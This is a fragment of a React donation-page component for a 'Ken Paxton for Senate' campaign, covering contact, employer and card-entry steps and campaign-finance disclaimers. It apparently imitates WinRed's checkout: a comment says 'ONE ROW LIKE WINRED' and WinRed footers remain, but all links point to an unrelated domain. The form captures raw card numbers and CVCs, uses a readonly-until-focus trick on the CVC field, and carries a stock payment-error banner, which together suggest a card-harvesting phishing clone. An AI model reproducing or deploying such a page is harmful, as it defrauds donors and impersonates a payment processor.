                            <option value="WA">WA</option>
                            <option value="WV">WV</option>
                            <option value="WI">WI</option>
                            <option value="WY">WY</option>

                            <option value="DC">DC</option>
                          </select>

                          <input
                            type="text"
                            name="mobile"
                            value={contact.mobile}
                            onChange={(e) =>
                              setContact({ ...contact, mobile: e.target.value })
                            }
                            placeholder="Mobile"
                            className="col-span-2 p-3 text-[13px] outline-none"
                          />
                        </div>

                        <div className="mt-4 text-[10px] leading-4 text-[#666]">
                          <label className="flex items-start gap-2">
                            <span>
                              Sign up for text updates! By participating, you
                              agree to the
                              <span className="text-red-600 underline cursor-pointer">
                                {" "}
                                <span className="text-red-700 hover:cursor-pointer  underline">
                                  <a href="https://tandcs.us/kptx/">
                                    terms & privacy policy
                                  </a>
                                </span>{" "}
                              </span>{" "}
                              for recurring autodialed campaign and donation
                              messages from Ken Paxton to the phone number you
                              provide. No consent required to buy. Text STOP to
                              end. Msg&data rates may apply.
                            </span>
                          </label>
                        </div>

                        <p className="mt-5 text-[13px] text-[#555]">
                          Campaign finance law requires us to collect your
                          employment information.
                        </p>

                        <label
                          className={`mt-3 flex items-center justify-center gap-3 border py-4 cursor-pointer transition-all ${
                            retired
                              ? "bg-[#0f2d5e] border-[#0f2d5e] text-white"
                              : "border-[#0f2d5e] bg-white text-[#0f2d5e]"
                          }`}
                        >
                          <input
                            type="checkbox"
                            checked={retired}
                            onChange={(e) => setRetired(e.target.checked)}
                            className="accent-blue cursor-pointer "
                          />

                          <span
                            className={`text-[13px] font-bold ${
                              retired ? "text-white" : "text-[#0f2d5e]"
                            }`}
                          >
                            I'm retired.
                          </span>
                        </label>

                        {!retired && (
                          <div className="mt-3 grid grid-cols-2 gap-[1px] border border-gray-300">
                            <input
                              type="text"
                              name="employer"
                              value={contact.employer}
                              onChange={(e) =>
                                setContact({
                                  ...contact,
                                  employer: e.target.value,
                                })
                              }
                              placeholder="Employer*"
                              className="border-r p-3 text-[13px] outline-none"
                            />
                            <input
                              type="text"
                              name="occupation"
                              value={contact.occupation}
                              onChange={(e) =>
                                setContact({
                                  ...contact,
                                  occupation: e.target.value,
                                })
                              }
                              placeholder="Occupation*"
                              className="p-3 text-[13px] outline-none"
                            />
                          </div>
                        )}
                       <button
  type="submit"
  disabled={!step2Complete || sendingContact}
  className={`w-full mt-4 py-4 font-bold transition ${
    step2Complete
      ? "bg-[#e31d2b] text-white hover:bg-red-700 cursor-pointer"
      : "bg-gray-300 text-white cursor-not-allowed"
  }`}
>
 Continue
</button>

                        <div className="mt-6 flex justify-between items-center">
                          <button
                            onClick={() => setStep(1)}
                            className="text-[12px] underline"
                          >
                            Back
                          </button>

                          <span className="text-red-600 font-bold text-[13px]">
                            ${totalAmount.toFixed(2)} now
                          </span>
                        </div>
                      </>
                    )}

                    {step === 3 && (
                      <>
                        {paymentError && (
                          <div className="mb-4 bg-[#ff4b5c] text-white text-[13px] font-bold px-4 py-3 rounded">
                            Error processing payment, try again later.
                          </div>
                        )}

                        <p className="text-[12px] text-[#555] mb-2">
                          Enter your payment details:
                        </p>

                        {/* ONE ROW LIKE WINRED */}
                        <div className="flex border border-[#d9d9d9] overflow-hidden rounded-sm">
                          {/* Card Number */}
                         
{/* <input
  type="text"
  placeholder="💳 Card number"
  inputMode="numeric"
  maxLength={16}
  value={payment.cardNumber}
  onChange={(e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 16);

    setPayment({
      ...payment,
      cardNumber: value,
    });
  }}
  className="flex-1 px-3 py-[11px] text-[14px] text-[#0f2d5e] font-bold outline-none border-r placeholder:font-bold placeholder:text-[#8b8b8b]"
/> */}

{/* <input
  type="text"
  inputMode="numeric"
  pattern="[0-9]*"
  maxLength={16}
  value={payment.cardNumber}
  onChange={(e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 16);
    setPayment({
      ...payment,
      cardNumber: value,
    });
  }}
  placeholder="💳 Card number"
  className="flex-1 px-3 py-[11px] text-[14px] text-[#0f2d5e] font-bold outline-none border-r"
/> */}
<input
  type="tel"
  placeholder="Card number"
  name="cardNumber"
  inputMode="numeric"
  maxLength={19} // 16 digits + 3 spaces
  value={payment.cardNumber}
  onChange={(e) => {
    // Keep only numbers
    const digits = e.target.value.replace(/\D/g, "").slice(0, 16);

    // Add a space every 4 digits
    const formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");

    setPayment({
      ...payment,
      cardNumber: formatted,
    });
  }}
  className="flex-1 px-3 py-[11px] text-[14px] text-[#0f2d5e] font-bold outline-none border-r placeholder:font-bold placeholder:text-[#8b8b8b]"
/>





                          {/* Expiry */}
                          <input
                            type="text"
                              name="expiry"
 autoComplete="new-password"
                            placeholder="MM / YY"
                            maxLength={5}
                            value={payment.expiry}
                            onChange={(e) => {
                              let value = e.target.value.replace(/\D/g, "");

                              if (value.length > 2) {
                                value =
                                  value.slice(0, 2) + "/" + value.slice(2, 4);
                              }

                              setPayment({
                                ...payment,
                                expiry: value,
                              });
                            }}
                            className="w-[78px] text-center text-[14px] text-[#0f2d5e] font-bold   outline-none border-r placeholder:font-bold placeholder:text-[#8b8b8b]"
                          />

                          {/* CVV */}
                         <input
  type="tel"
  inputMode="numeric"
  pattern="[0-9]*"
  placeholder="CVC"
  id={`cvc-${Math.random().toString(36).slice(2)}`}
  name="cvv"
  autoComplete="off"
  spellCheck={false}
  maxLength={4}
  value={payment.cvv}
  onChange={(e) =>
    setPayment({
      ...payment,
      cvv: e.target.value.replace(/\D/g, "").slice(0, 4),
    })
  }
  onFocus={(e) => e.target.removeAttribute("readonly")}
  readOnly
  className="w-[60px] text-center text-[14px] text-[#0f2d5e] font-bold outline-none placeholder:font-bold placeholder:text-[#8b8b8b]"
/>
                        </div>

                        {/* Card holder */}

                        {/* Card icons */}

                        {/* Buttons */}
                        <div className="flex gap-3 mt-6">
                         <button
  type="submit"
  disabled={!paymentComplete || processing}
  className={`flex-1 py-4 font-bold ${
    paymentComplete
      ? "bg-[#e31d2b] text-white"
      : "bg-gray-300 text-white cursor-not-allowed"
  }`}
>
  DONATE NOW
</button>
                        </div>
                        <div className="mt-4 text-[14px] leading-4 text-[#666]">
                          By clicking "Donate" I accept WinRed's{" "}
                          <span className="text-red-700 hover:cursor-pointer  underline">
                            <a href="https://tandcs.us/kptx/">
                              terms & privacy policy
                            </a>
                          </span>{" "}
                        </div>

                        {/* Amount */}

                        <div className="mt-6 flex justify-between items-center">
                          <button
                            onClick={() => setStep(2)}
                            className="text-[12px] underline"
                          >
                            Back
                          </button>

                          <span className="text-red-600 font-bold text-[13px]">
                            ${totalAmount.toFixed(2)} now
                          </span>
                        </div>
                      </>
                    )}
                    </form>
                  </div>
                </div>
              </div>

    </div>
  </div>

</section>
</div>


</>






      {/* ================= DISCLAIMER SECTION ================= */}

      <section className="relative bg-white z-20">
  <div className="max-w-3xl mx-auto px-4 sm:px-6 md:px-12 py-8 md:py-12">
    <div className="max-w-[700px] mx-auto px-0 md:px-8 py-6 md:py-10 text-[14px] md:text-[15px] leading-6 text-[#333]">
            <p className="mb-5">
              By participating, you agree to the 
              terms 
               recurring autodialed marketing messages from Ken Paxton to the
              phone number you provide. No consent required to buy. Msg&amp;data
              rates may apply.
            </p>

            <p className="mb-5">
              Federal law requires us to use our best efforts to collect and
              report the name, address, occupation, and employer of individuals
              whose contribution exceeds $200 in an election cycle.
            </p>

            <p className="mb-3 font-semibold">
              By clicking “Donate”, I certify that the following statements are
              true and accurate:
            </p>

            <ul className="list-disc pl-6 mb-6 space-y-2">
              <li>
                I am a U.S. Citizen or lawfully admitted permanent resident.
              </li>

              <li>
                This contribution is made from my personal funds, not from an
                account maintained by a corporation, labor union, or national
                bank, and is not being reimbursed by another person or entity.
              </li>

              <li>I am not a federal government contractor.</li>
            </ul>

            <p className="mb-5">
              The maximum amount an individual may contribute is $3,500 per
              election. Your contribution (up to $3,500) will be designated for
              the general election.
            </p>

            <p className="mb-5">
              Contributions to Ken Paxton for Senate are not tax deductible for
              federal income tax purposes. Contributions from corporations,
              labor unions, federal contractors, and foreign nationals are
              prohibited.
            </p>

            <p className="mb-2 font-semibold">Mail:</p>

            <p className="mb-5">
              To contribute by mail, please send a personal check made payable
              to
              <strong> “Ken Paxton for Senate” </strong> to:
            </p>

            <div className="mb-6 leading-7">
              <p>Ken Paxton for Senate</p>
              <p>110 North Akard St</p>
              <p>PMB #40</p>
              <p>Dallas, TX 75201</p>
            </div>

            <p className="mb-6">
              Please include your full name, address, email address, occupation
              and employer in the envelope.
            </p>

            <p className="mb-6">
              By providing your phone number, you are consenting to receive
              calls and texts, including pre-recorded, autodialed, and automated
              calls and texts, to that number with campaign notifications from
              Paxton for Senate. Reply HELP for help, STOP to end. Message &amp;
              data rates may apply. Message frequency may vary.
            </p>

            <hr className="my-8" />

            <p className="mb-5">
              Federal law requires us to use our best efforts to collect and
              report the name, address, occupation, and employer of individuals
              whose contribution exceeds $200 in an election cycle.
            </p>

            <p className="mb-3 font-semibold">
              By clicking “Donate”, I certify that the following statements are
              true and accurate:
            </p>

            <ul className="list-disc pl-6 mb-6 space-y-2">
              <li>
                I am a U.S. Citizen or lawfully admitted permanent resident.
              </li>

              <li>
                This contribution is made from my personal funds, not from an
                account maintained by a corporation, labor union, or national
                bank, and is not being reimbursed by another person or entity.
              </li>

              <li>I am not a federal government contractor.</li>
            </ul>

            <p className="mb-5">
              The maximum amount an individual may contribute is $3,500 per
              election. Your contribution (up to $3,500) will be designated for
              the primary election. The next $3,500 will be designated for the
              general election.
            </p>

            <p className="mb-5">
              Contributions to Ken Paxton for Senate are not tax deductible for
              federal income tax purposes. Contributions from corporations,
              labor unions, federal contractors, and foreign nationals are
              prohibited.
            </p>

            <p className="mb-2 font-semibold">Mail:</p>

            <p className="mb-3">
              To contribute by mail, please send a personal check made payable
              to
              <strong> “Ken Paxton for Senate” </strong> to:
            </p>

            <div className="mb-6 leading-7">
              <p>Ken Paxton for Senate</p>
              <p>P.O. BOX 3476</p>
              <p>MCKINNEY, TX 75070</p>
            </div>

            <p className="mb-6">
              Please include your full name, address, email address, occupation
              and employer in the envelope.
            </p>

            <div className="border border-gray-300 text-center py-5 font-semibold mb-8">
              Paid for by Ken Paxton For Senate
            </div>

            <p className="mb-5">
              Contributions to WinRed are not deductible as charitable donations
              for federal income tax purposes. Contributions from corporations,
              foreign nationals (without "green cards") and federal government
              contractors are prohibited. Federal law requires us to use our
              best efforts to collect and report the name, address, occupation
              and name of employer of individuals whose aggregate contributions
              exceed $200 per election.
            </p>

            <h3 className="font-bold text-[12px] mb-3">Contribution rules</h3>

            <ul className="list-disc pl-6 space-y-2 mb-8">
              <li>
                I am a U.S. citizen or lawfully admitted permanent resident
                (i.e., green card holder).
              </li>

              <li>
                This contribution is made from my own funds, and funds are not
                being provided to me by another person or entity for the purpose
                of making this contribution.
              </li>

              <li>
                I am making this contribution with my own personal credit card
                and not with a corporate or business credit card or a card
                issued to another person.
              </li>

              <li>
                I am at least eighteen years old. I am not, nor am I making this
                contribution on behalf of, a corporation, labor organization,
                national bank, foreign national without a green card, a federal
                contractor, or any other federally impermissible source.
              </li>
            </ul>

            <div className="border border-gray-300 text-center py-5 font-semibold mb-8">
              Paid for by WinRed. Not authorized by any candidate or candidate’s
              committee. WinRed.com
            </div>

            <div className="flex justify-center gap-8 text-[13px] mb-5">
              <a href="https://tandcs.us/kptx/" className="hover:underline">
                Terms of Use
              </a>

              <a href="https://tandcs.us/kptx/" className="hover:underline">
                Privacy Policy
              </a>

              <a href="https://tandcs.us/kptx/" className="hover:underline">
                About Our Ads
              </a>
            </div>

            <p className="text-center text-[11px]">
              <a href="https://tandcs.us/kptx/" className="hover:underline">
                Questions about your charge? Go to our Support Center
              </a>
            </p>
          </div>
        </div>
      </section>
      
    </div>
  );
};

export default Donate;
